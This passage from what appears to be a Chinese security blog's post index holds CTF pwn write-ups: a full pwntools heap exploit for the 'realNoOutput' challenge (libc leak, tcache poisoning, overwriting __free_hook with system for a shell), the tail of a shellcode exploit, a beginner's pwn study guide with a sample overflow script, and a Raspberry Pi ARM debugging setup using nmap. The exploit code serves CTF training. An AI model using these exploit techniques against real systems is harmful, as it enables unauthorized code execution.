class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">    mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">    mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">    mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    sl(io,asm(shellcode2))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27832</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">pwn()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h1 id="realNoOutput"><a href="#realNoOutput" class="headerlink" title="realNoOutput"></a>realNoOutput</h1><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805165752186.png" alt="add"></p><p>这里我们可以看到，<strong>idx的范围是0-9，一共10个chunk</strong>，我们看看它的size数组和addr数组</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805165924643.png" alt="size&amp;addr"></p><p>发现其<strong>size数组大小为8</strong>，说明数组size大小有问题。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170703356.png" alt="delete"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170814359.png" alt="edit"></p><p>我们可以看到上图edit函数里如果不执行if函数仍然可以借助栈里残留的值来进行赋值，从而实现uaf</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170836608.png" alt="show"></p><h2 id="脚本编写-1"><a href="#脚本编写-1" class="headerlink" title="脚本编写"></a>脚本编写</h2><p>我们先来泄露其libc，由于chunk申请出来的时候没有清理内存，所以我们可以将放在unsorted_bin中的chunk申请出来，得到libc基地址。先填满tcache</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    dele(<span class="number">7</span>-i)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">libc.address=un_addr-<span class="number">0x1ebce0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805163202933.png" alt="获取基地址"></p><p>再泄露一些我们需要的函数地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system : &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br></pre></td></tr></table></figure><p>接下来需要的就是劫持free_hook来获取shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure><p>chunk1和2是为了填充tcache，chunk3是为了后面劫持free_hook到system作为参数使用的。</p><p>至于chunk8是为了将chunk0的heap_addr赋值，由于数组越界，我们的chunk8的size会作为chunk0的地址使用。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805205403681.png" alt="addr数组"></p><p>接下来我们就要劫持free_hook了，先将free_hook放在tcache的链表上</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br></pre></td></tr></table></figure><p>这里edit的地址并不是chunk0的而是已经被free的chunk2遗留在栈上的，所以这里构造了一个uaf。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805205633751.png" alt="劫持free_hook"></p><p>剩下的事情就简单了我们将free_hook申请出来，将其修改为system的地址，然后delete之前准备好写有”/bin/sh\x00”的堆块，即可拿取shell。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./realNoOutput&quot;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,27832)</span></span><br><span class="line"><span class="comment">#io=gdb.debug(&#x27;./test&#x27;,&#x27;b *0x080492D4&#x27;)</span></span><br><span class="line"><span class="comment">#one_gadget=[0x4f3d5,0x4f432,0x10a41c]</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./realNoOutput&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,29826)</span></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,cont</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,cont)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,cont)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    dele(<span class="number">7</span>-i)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">libc.address=un_addr-<span class="number">0x1ebce0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system : &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn入门指南</title>
      <link href="/2021/07/19/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2021/07/19/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写这篇是因为学校社团招新需要给学弟学妹每个方向的大致印象，发展方向，当然我也希望这篇文章可以帮助到更多的人。接下来我会介绍一下入门pwn需要准备一些什么，学习一些什么，希望这些不成熟的意见可以帮助到刚开始入门pwn的你。由于篇幅有限，这里不会详细介绍各个知识点，更多的是一些链接，不涉及具体内容，只是帮你找到你应该学什么，推荐一些学习资源。</p><h1 id="书籍推荐"><a href="#书籍推荐" class="headerlink" title="书籍推荐"></a>书籍推荐</h1><p>这里推荐一些适合刚刚准备入门pwn方向的书籍，所以这里并没有列出一些pwn方向很重要，但不是新手需要的书籍。</p><h2 id="《程序员的自我修养：链接装载与库》"><a href="#《程序员的自我修养：链接装载与库》" class="headerlink" title="《程序员的自我修养：链接装载与库》"></a>《程序员的自我修养：链接装载与库》</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/1b4c510fd9f9d72a95616a43df2a2834349bbb63" alt="程序员的自我修养"></p><p>这本书是对pwn入门来说非常非常有用的一本书，可以说是一本必读的书，能让你更清楚的了解很多pwn知识点背后的逻辑。可以说是必读的书了。</p><h2 id="《CTF竞赛权威指南（Pwn篇）》"><a href="#《CTF竞赛权威指南（Pwn篇）》" class="headerlink" title="《CTF竞赛权威指南（Pwn篇）》"></a>《CTF竞赛权威指南（Pwn篇）》</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/0b55b319ebc4b74543a9b3057cb609178a82b901bfc4" alt="ctf权威指南"></p><p>书中涵盖了pwn各个方向的知识点，虽说很多最新的知识点该书不能提供，但是作为入门数据，这本书的知识点起码够你学大半年了。比市面上其他ctf入门书籍更加适合pwn手，强烈推荐。</p><h2 id="《深入理解计算机系统（又名CSAPP）》"><a href="#《深入理解计算机系统（又名CSAPP）》" class="headerlink" title="《深入理解计算机系统（又名CSAPP）》"></a>《深入理解计算机系统（又名CSAPP）》</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/s29195878.jpg" alt="csapp"></p><p>这是一本很厚重的书，虽说没有像上面两本书那么直接对pwn做题有直接帮助，但是这本书一定是pwn方向，不不不，它可以说是所有计算机方向必读书籍了，对你长期成长来说肯定有帮助，希望在闲暇时间去读一读。</p><h1 id="网站以及入门视频推荐"><a href="#网站以及入门视频推荐" class="headerlink" title="网站以及入门视频推荐"></a>网站以及入门视频推荐</h1><p>刷题网站和ctfwiki这里就不做过多的赘述了，这里提供一些适合新人pwn方向独有的平台，和自己觉得不错的入门视频</p><h2 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210719104848925.png" alt="pwnable.kr"></p><p>网址：<a href="https://pwnable.kr/">https://pwnable.kr/</a></p><p>这个平台的漏洞虽然和我们国内比赛主流方向的关系不是很大，但是里面有很多可以学习的知识点，还是很推荐大家做一做的，很多题目比较适合新手。</p><h2 id="XMCVE-2020-CTF-Pwn入门课程"><a href="#XMCVE-2020-CTF-Pwn入门课程" class="headerlink" title="XMCVE 2020 CTF Pwn入门课程"></a>XMCVE 2020 CTF Pwn入门课程</h2><p>网址：<a href="https://www.bilibili.com/video/BV1854y1y7Ro?share_source=copy_web">https://www.bilibili.com/video/BV1854y1y7Ro?share_source=copy_web</a></p><p>这部视频可以说是全b站最为详细的pwn入门视频了，细节抓的很清楚，缺点就是过于详实，可能会让你缺少一份自己的思考，视频时间也过长，需要耐心观看</p><h2 id="2020暑期Lilac-pwn入门培训"><a href="#2020暑期Lilac-pwn入门培训" class="headerlink" title="2020暑期Lilac-pwn入门培训"></a>2020暑期Lilac-pwn入门培训</h2><p>网址：<a href="https://www.bilibili.com/video/BV1Dt4y1D7mK?share_source=copy_web">https://www.bilibili.com/video/BV1Dt4y1D7mK?share_source=copy_web</a></p><p>这部视频其实是我入门时观看的视频，个人感觉讲解的很充分了，适合想要快速入门开始刷题的师傅们，其实从博客和题目中学习也是一种比较有效的方法</p><h1 id="pwn入门需要的基础知识"><a href="#pwn入门需要的基础知识" class="headerlink" title="pwn入门需要的基础知识"></a>pwn入门需要的基础知识</h1><h2 id="掌握c语言"><a href="#掌握c语言" class="headerlink" title="掌握c语言"></a>掌握c语言</h2><p>想要学习pwn首先就要学习c语言，这是最最最基础的工作，如果没有学习过c语言，可能连题目都看不懂。</p><p>推荐翁恺老师的c语言课程：<a href="https://www.icourse163.org/course/ZJU-9001?from=searchPage">https://www.icourse163.org/course/ZJU-9001?from=searchPage</a></p><h2 id="学习汇编"><a href="#学习汇编" class="headerlink" title="学习汇编"></a>学习汇编</h2><p>学习pwn还是要懂汇编语言的，起码先学习x86/x64下的汇编语言，学好汇编会让你开始的路走的很轻松，可以先学习8060的汇编，推荐王爽老师的《汇编语言》</p><h2 id="使用ida"><a href="#使用ida" class="headerlink" title="使用ida"></a>使用ida</h2><p>ida是一个非常好用的静态分析工具，可以说是一个神器，她会帮助你非常轻松的分析出题目的逻辑，基本是必须会使用的工具。你会发现ida的图标是一个女性，其实这是第一位程序员，她的名字就叫ida。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210719111139804.png" alt="image-20210719111139804"></p><p>推荐一篇博客：<a href="https://xz.aliyun.com/t/4205%EF%BC%8C%E8%BF%99%E9%87%8C%E6%9C%89%E8%AF%A6%E7%BB%86%E7%9A%84%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B">https://xz.aliyun.com/t/4205，这里有详细的使用教程</a></p><h2 id="使用pwndbg"><a href="#使用pwndbg" class="headerlink" title="使用pwndbg"></a>使用pwndbg</h2><p>这其实是一个gdb的调试插件，这个工具可以帮助你更好的进行动态分析。关于工具的安装可以看我的另一篇博客，虽然是针对arm架构的树莓派的，但对于x64的ubuntu也适用。</p><p>安装：<a href="https://kr0emer.com/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/#pwn%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">https://kr0emer.com/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/#pwn%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</a></p><h2 id="使用pwntools"><a href="#使用pwntools" class="headerlink" title="使用pwntools"></a>使用pwntools</h2><p>pwnatools的安装上面的链接中也有，这是一个编写python交互的库，是pwn入门必备的工具。</p><p>编写脚本类似这样：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">44908</span>)</span><br><span class="line">sh_addr=<span class="number">0x0804868B</span></span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">24</span>+p32(sh_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">262</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;your username:&quot;</span>,<span class="string">&#x27;kreomer&#x27;</span>) </span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;your passwd:&quot;</span>,payload) </span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>官方教程：<a href="https://docs.pwntools.com/en/latest/">https://docs.pwntools.com/en/latest/</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>pwn入门的基础基本就是以上这些，想要了解具体的攻击方法可以通过以上书籍、视频或者借助ctfwiki来学习（<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/%EF%BC%89%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%8F%AA%E6%98%AF%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%8C%87%E5%8D%97%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E6%B6%89%E5%8F%8A%E5%85%B7%E4%BD%93%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E3%80%82%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%BB%A5%E4%B8%8A%E6%8F%90%E4%BE%9B%E7%9A%84%E9%93%BE%E6%8E%A5%E8%BF%9B%E8%A1%8C%E5%AD%A6%E4%B9%A0%E3%80%82">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/），由于只是一个简单的指南，这里不涉及具体漏洞的攻击方法。可以通过以上提供的链接进行学习。</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用树莓派实现arm架构下的heap调试</title>
      <link href="/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/"/>
      <url>/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="一切的开始"><a href="#一切的开始" class="headerlink" title="一切的开始"></a>一切的开始</h1><p>​    在最近半年多的比赛中总是可以看到很多都涉及arm架构，比如：红明谷，虎符，国赛等大大小小的比赛都涉及了关于arm架构的题目。常规的做法是搭建<strong>quem</strong>虚拟机，然后使用<strong>gdbserver</strong>远程调试，来达到调试目的，当然也可以再用<strong>patchelf</strong>改一下动态链接库，使用<strong>python脚本</strong>交互。但是这样调试起来会发现没有调试，这种情况下当然也可以通过查看内存分布来进行调试。<strong>缺少了调试符调试起来感觉太麻烦了，也不够直观</strong>。当时的第一反应是下载<strong>带调试符的libc</strong>，当我找到对应版本的带有<strong>.debug</strong>文件的libc文件，使用patchelf将其和我们的binary绑定，同样使用quem来进行调试，可是这样依旧是显示没有调试符。而且看之前大师傅的博客说quem会存在一些奇奇怪怪的bug，就想是否可以直接使用arm架构的<strong>树莓派</strong>来搭建环境，调试arm下的题目。网上我查了好久也没找到类似的文章，就只能自己来试试了，顺便写出来分享给大家我的拙见，如果对你有帮助就太好了，也乘此机会搭建起来自己的博客，这就是我写这篇文章的开始，也是我博客的开始。</p><h1 id="树莓派的选择和ubuntu镜像烧录"><a href="#树莓派的选择和ubuntu镜像烧录" class="headerlink" title="树莓派的选择和ubuntu镜像烧录"></a>树莓派的选择和ubuntu镜像烧录</h1><h2 id="树莓派以及其他硬件的选择"><a href="#树莓派以及其他硬件的选择" class="headerlink" title="树莓派以及其他硬件的选择"></a>树莓派以及其他硬件的选择</h2><p>​    树莓派我选择的是<em>Raspberry Pi 4</em>，内存大小4GB，感觉就调试arm题目的话性能有点溢出，因为不使用桌面，所以内存可以选小一点，没必要选择这么大的内存，当然一切随你喜好。貌似还有香橙派，我不知道怎么样，有兴趣可以尝试，不保证可以搭配后面的流程，但其<strong>价格</strong>确实可爱的多。</p><p>​    树莓派使用的是<strong>tf</strong>卡，我觉得没必要买太大容量的，我环境完全搭建完成后也没有用太大的容量，同样是因为不需要桌面的原因。我们可以选择<strong>16GB</strong>的，这个容量应该是足够了。配套的需要一个一个<strong>读卡器</strong>来烧录镜像。</p><p>​    电源是<strong>5.1v=3.0A</strong>的，<strong>type-c</strong>接口，可以考虑使用手机充电器，但是最好还是买一个充电器比较好，这样比较方便。也可以考虑官方的充电器，就是有点小贵。</p><p>​    顺便一提，最好买个“机箱”，这样能保护好电路板，方便携带，同时要做好散热工作，散热片是要的，也可以使用一个小风扇。类似下图</p><p>​    <img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210716193707410.png" alt="树莓派机箱和风扇"></p><p>​    这里可能还需要使用显示屏和键盘，当然只有第一次搭建的时候需要使用，ubuntu官方文档中说可以不需要，但是我尝试了有一整天，并不能达到我想要的效果，这里放在后面环境搭建的时候再说。树莓派的视频接口是<strong>Micro</strong>，所以你需要有一头是Micro的视频传输线，也可以使用转换接口，我使用的就是转换接口，毕竟只用这一次，没必要买太贵的，键盘和显示屏都是借用舍友的，这里感谢我的舍友。</p><p>​    硬件就是这些啦，准备好硬件后就可以进行烧录和启动我们的ubuntu系统啦</p><h2 id="ubuntu环境的烧录和启动"><a href="#ubuntu环境的烧录和启动" class="headerlink" title="ubuntu环境的烧录和启动"></a>ubuntu环境的烧录和启动</h2><p>​    这里提供一个链接指导我们的安装ubuntu镜像(<a href="https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#1-overview">https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#1-overview</a>),</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717084431014.png" alt="烧录工具"></p><p>​    这里有三个不同的选项根据你主机的操作系统选择合适的烧录。具体的烧录方法可以参考上面的链接，内容很详实。一定要仔细看上面的官方文档，不然可能会出现一些奇奇怪怪的问题。</p><p>​    关于树莓派的wifi链接这里有个大坑，官方文档是这样说的：</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717090334507.png" alt="官方文档截图"></p><p>​    </p><p>但是实际上这里如果没有显示屏和键盘的话无法重启进行重启，也就<strong>无法连接</strong>到wife，而且由于某些奇怪的原因这个<strong>配置文件</strong>还需要在开机后再次编写以保证格式，所以之前准备工作才说明需要显示屏和键盘，当然你也可以再尝试尝试，说不定就成功了，有时候挺玄学的。</p><p>这里我基本花了一天时间，大多数时间在无意义的修改配置文件，因为没有显示屏转换器，以为是配置文件格式问题，结果花了一天时间都没解决，等转换器到了使用显示器基本一会就解决了，只要你的配置文件格式保证，开机后设置密码，然后<strong>重启</strong>，重启以后<strong>等待一会</strong>基本就可以连接到wifi了，如果无法链接，检查一下配置文件</p><p><strong>注意：配置文件中冒号后面一定有换行或者空格，而且还要注意对齐</strong>。</p><h1 id="寻找树莓派IP以及ssh连接"><a href="#寻找树莓派IP以及ssh连接" class="headerlink" title="寻找树莓派IP以及ssh连接"></a>寻找树莓派IP以及ssh连接</h1><h2 id="寻找树莓派ip地址"><a href="#寻找树莓派ip地址" class="headerlink" title="寻找树莓派ip地址"></a>寻找树莓派ip地址</h2><p>官方文档给了一种寻找树莓派的方法，但是我尝试过后感觉并不是很有用，后来发现其mac地址和官方的有出入，假如你使用的是手机热点，并且你的手机热点可以显示ip地址最好不过了，如果是其他情况的话这里我推荐使用<strong>Nmap</strong>来进行扫描。</p><p>这里肯定先要保证你和树莓派在同一个wifi下，然后检查你本地的ip地址win操作系统下使用<code>ipconfig</code>查看本地IP地址</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717093955362.png" alt="查看本地ip"></p><p>可以看到<strong>ip</strong>地址是192.168.43.29,<strong>子网掩码</strong>是255.255.255.0，那么我们就要检查192.168.43.1/24这个网络下的存活的ip有哪些</p><p>使用<code>nmap -sP 192.168.43.1/24</code>命令我们可以看到</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717094520150.png" alt="寻找树莓派"></p><p>有两台存活主机，一台是我们主机，那么另一台就是我们的树莓派了，当然可以看到其mac地址后面也告诉我们这台主机是树莓派。这样我们就找到我们树莓派的ip是192.168.43.29。</p><h2 id="使用FInallshell进行连接"><a href="#使用FInallshell进行连接" class="headerlink" title="使用FInallshell进行连接"></a>使用FInallshell进行连接</h2><p>接下来我推荐使用Finalshell来建立连接。这个工具要比xshell好用好多了</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095624945.png" alt="Finalshell"></p><p>首先点击这里打开连接管理器</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095715919.png" alt="连接管理器"></p><p>再点击这里新建ssh连接</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095821208.png" 